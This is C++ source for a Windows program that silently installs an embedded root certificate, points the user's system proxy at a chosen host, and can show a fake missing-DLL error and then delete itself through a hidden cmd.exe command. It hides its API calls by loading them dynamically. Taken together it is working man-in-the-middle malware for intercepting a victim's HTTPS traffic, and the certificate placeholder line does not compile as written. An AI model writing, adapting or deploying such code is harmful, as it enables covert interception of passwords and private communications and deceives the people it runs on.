#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <algorithm>
#include <iostream>

#pragma comment(lib, "crypt32.lib")

// ────────────────────────────────────
//  Dynamic WinAPI pointers (minimal set)
// ────────────────────────────────────
using RegCreateKeyExW_t    = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
using RegSetValueExW_t     = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
using RegOpenKeyExW_t      = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
using RegCloseKey_t        = LONG (WINAPI*)(HKEY);
using InternetSetOptionW_t = BOOL (WINAPI*)(HINTERNET, DWORD, LPVOID, DWORD);
using CreateProcessW_t     = BOOL (WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
using CloseHandle_t        = BOOL (WINAPI*)(HANDLE);
using MessageBoxW_t        = UINT (WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT);

static RegCreateKeyExW_t    pRegCreateKeyExW    = nullptr;
static RegSetValueExW_t     pRegSetValueExW     = nullptr;
static RegOpenKeyExW_t      pRegOpenKeyExW      = nullptr;
static RegCloseKey_t        pRegCloseKey        = nullptr;
static InternetSetOptionW_t pInternetSetOptionW = nullptr;
static CreateProcessW_t     pCreateProcessW     = nullptr;
static CloseHandle_t        pCloseHandle        = nullptr;
static MessageBoxW_t        pMessageBoxW        = nullptr;

void InitDynamicImports() {
    HMODULE hAdv = LoadLibraryW(L"Advapi32.dll");
    pRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddress(hAdv, "RegCreateKeyExW");
    pRegSetValueExW  = (RegSetValueExW_t) GetProcAddress(hAdv, "RegSetValueExW");
    pRegOpenKeyExW   = (RegOpenKeyExW_t)  GetProcAddress(hAdv, "RegOpenKeyExW");
    pRegCloseKey     = (RegCloseKey_t)    GetProcAddress(hAdv, "RegCloseKey");

    HMODULE hInet = LoadLibraryW(L"Wininet.dll");
    pInternetSetOptionW = (InternetSetOptionW_t)GetProcAddress(hInet, "InternetSetOptionW");

    HMODULE hKernel = LoadLibraryW(L"Kernel32.dll");
    pCreateProcessW  = (CreateProcessW_t)GetProcAddress(hKernel, "CreateProcessW");
    pCloseHandle     = (CloseHandle_t)   GetProcAddress(hKernel, "CloseHandle");

    HMODULE hUser = LoadLibraryW(L"User32.dll");
    pMessageBoxW = (MessageBoxW_t)GetProcAddress(hUser, "MessageBoxW");
}

// ────────────────────────────────────
//  Embedded CA certificate placeholder (replaced at build time)
// ────────────────────────────────────
static const char* embedded_ca = *;

// ────────────────────────────────────
//  Install PEM certificate into CurrentUser\Root
// ────────────────────────────────────
bool InstallCertWindows() {
    const char* header = "-----BEGIN CERTIFICATE-----";
    const char* footer = "-----END CERTIFICATE-----";
    const char* start  = strstr(embedded_ca, header);
    const char* end    = strstr(embedded_ca, footer);
    if (!start || !end) return false;

    start += strlen(header);
    std::string base64(start, end - start);
    base64.erase(std::remove_if(base64.begin(), base64.end(), ::isspace), base64.end());

    DWORD derSize = 0;
    if (!CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &derSize, nullptr, nullptr))
        return false;

    std::vector<BYTE> der(derSize);
    if (!CryptStringToBinaryA(base64.c_str(), 0, CRYPT_STRING_BASE64, der.data(), &derSize, nullptr, nullptr))
        return false;

    auto addToStore = [&](const wchar_t* storeName) -> bool {
        HCERTSTORE store = CertOpenStore(
            CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY)0,
            CERT_SYSTEM_STORE_CURRENT_USER, storeName);
        if (!store) return false;
        BOOL ok = CertAddEncodedCertificateToStore(
            store, X509_ASN_ENCODING,
            der.data(), derSize,
            CERT_STORE_ADD_REPLACE_EXISTING, NULL);
        CertCloseStore(store, 0);
        return ok == TRUE;
    };

    // try CurrentUser\Root, then fallback to CA
    return addToStore(L"Root") || addToStore(L"CA");
}

// ────────────────────────────────────
//  Proxy helpers (Current User)
// ────────────────────────────────────
bool EnableProxyWindows(const std::wstring& host, int port) {
    HKEY hKey;
    if (pRegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD enable = 1;
    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
                    reinterpret_cast<const BYTE*>(&enable), sizeof(enable));

    std::wstring proxy = host + L":" + std::to_wstring(port);
    pRegSetValueExW(hKey, L"ProxyServer", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(proxy.c_str()),
        static_cast<DWORD>((proxy.size() + 1) * sizeof(wchar_t)));
    pRegCloseKey(hKey);

    pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    pInternetSetOptionW(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
    return true;
}

bool DisableProxyWindows() {
    HKEY hKey;
    if (pRegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return false;

    DWORD disable = 0;
    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
                    reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
    pRegCloseKey(hKey);

    pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    pInternetSetOptionW(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
    return true;
}

// ────────────────────────────────────
//  Fake error + self-delete
// ────────────────────────────────────
#ifdef FAKE_DLL_POPUP
void ShowFakeError() {
    pMessageBoxW(NULL,
        L"The program can’t start because d3dx11_43.dll is missing from your computer.\nTry reinstalling the program to fix this problem.",
        L"Error",
        MB_ICONERROR | MB_OK);
}
#else
inline void ShowFakeError() {}
#endif

#ifdef SELF_DELETE
void ScheduleSelfDelete() {
    wchar_t exePath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) return;

    std::wstring cmd = L"cmd.exe /C ping 127.0.0.1 -n 1 > NUL & del /Q /F \"" +
                       std::wstring(exePath) + L"\"";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;

    pCreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    exit(0);
}
#else
inline void ScheduleSelfDelete() {}
#endif

// ────────────────────────────────────
//  Entry point
// ────────────────────────────────────
int wmain(int argc, wchar_t* argv[]) {
    InitDynamicImports();

    std::wstring host = L"127.0.0.1";
    int port = 8080;
    bool disable = false;

    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"--port") == 0 && i + 1 < argc) {
            port = _wtoi(argv[++i]);
        } else if (wcscmp(argv[i], L"--disable") == 0) {
            disable = true;
        } else if (argv[i][0] != L'-') {
            host = argv[i];
        }
    }

    if (!disable) {
        if (!InstallCertWindows()) return 1;
        if (!EnableProxyWindows(host, port)) return 1;
#ifdef FAKE_DLL_POPUP
        ShowFakeError();
#endif
    } else {
        if (!DisableProxyWindows()) return 1;
    }

#ifdef SELF_DELETE
    ScheduleSelfDelete();
#endif
    return 0;
}
